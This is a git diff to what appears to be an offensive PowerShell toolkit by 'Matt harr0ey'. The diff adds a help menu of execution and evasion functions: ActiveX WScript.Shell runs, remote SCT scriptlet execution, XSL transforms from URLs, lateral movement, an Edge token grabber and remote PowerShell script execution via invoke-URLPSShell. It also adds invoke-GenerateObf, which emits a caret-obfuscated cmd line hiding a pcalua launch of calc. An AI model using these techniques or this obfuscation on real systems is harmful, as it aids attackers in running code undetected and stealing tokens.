@@ -132,7 +132,7 @@ Write-Host -ForegroundColor Green "
 6  invoke-VBNET -CMLShell calc.exe
 7  invoke-XMLTransform -XSL URL -XML URL
 8  invoke-OpenWith -CML notepad.exe
-9  invoke-invoke-DxCap -CML notepad.exe
+9  invoke-DxCap -CML notepad.exe
 10 invoke-ApplicationShellExecute -CML calc.exe  
 11 invoke-ADinfo -Type List    
 12 Get-TokenMsftEdge -Type List
@@ -187,6 +187,129 @@ Read-Host -Prompt Enter
 
 
 
+function invoke-help {
+
+
+
+    [Cmdlet]
+
+
+
+
+
+
+
+
+}
+
+
+function invoke-GenerateObf {
+
+ <#
+ 
+
+ .Author Matt harr0ey @harr0ey
+ .License BSD3
+ .Required Dependencies : None 
+ .Optional Dependencies : None 
+
+ .Broadly Generate Strings of Obfuscation Code inside CMD Prompt 
+
+
+ .Exmaple 
+  PS:> invoke-GenerateObf -Type strings
+ 
+ 
+ 
+ #>
+
+
+ [CmdletBinding()]
+
+    param (
+    
+    [Parameter(Mandatory=$true)]
+    [Parameter(Position = 0, ParameterSetName = 'Type')]  
+    [Parameter(Position = 0, ParameterSetName = 'Strings')] 
+    [String]
+     $Type
+
+
+    )
+
+    If($Type) {
+        
+      try{
+      $Obj = Write-Host " 
+     p^c^a^l^u^a^ ^-^n^ ^-^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a c^a^l^c^ ^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a
+      "  -BackgroundColor Gray
+      
+      
+      }Catch {
+      
+      
+      throw "Write-Host 'Mistake because input inside Your Strings ' "
+      
+      }
+    
+    
+  
+    }
+
+
+
+
+}
+
+
+
+function invoke-help {
+
+
+[CmdletBinding()]
+    
+    param(
+    
+    [Parameter(Mandatory=$true)]
+
+    [Parameter(Position = 0, ParameterSetName = 'Pattern')]
+    [String]
+    $Pattern
+    
+    
+    )
+
+        if ($like = $Pattern) {
+        Write-Host "
+
+1  invoke-ConfusionJS -Command 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
+2  invoke-Confusions-LLMTCOMCLSID -CLSID 
+3  invoke-SCTExecution -SCT  http:///local.sct/
+4  invoke-DLLLaunchApplication -CML calc.exe
+5  invoke-lateralmovement -Command calc.exe
+6  invoke-VBNET -CMLShell calc.exe
+7  invoke-XMLTransform -XSL URL -XML URL
+8  invoke-OpenWith -CML notepad.exe
+9  invoke-DxCap -CML notepad.exe
+10 invoke-ApplicationShellExecute -CML calc.exe  
+11 invoke-ADinfo -Type List    
+12 Get-TokenMsftEdge -Type List
+13 invoke-URLPSShell -URI URL!    
+
+        "
+
+    }
+
+
+
+
+
+
+
+
+}
+
+
 
 function invoke-URLPSShell {
 <#
@@ -199,8 +322,11 @@ function invoke-URLPSShell {
 
  .Description vicarious of Broadly Execute in Natural Mode Powershell Remotely Script 
 
+
  .Exmaple 
   PS:> invoke-URLPSShell -URI !URLScript
+
+
 
 #>
 
@@ -213,8 +339,7 @@ function invoke-URLPSShell {
 
      [Parameter(Position = 0, ParameterSetName = 'URI')]
 
-     [string]
-     $URI
+     [string]$URI
      
      )
 
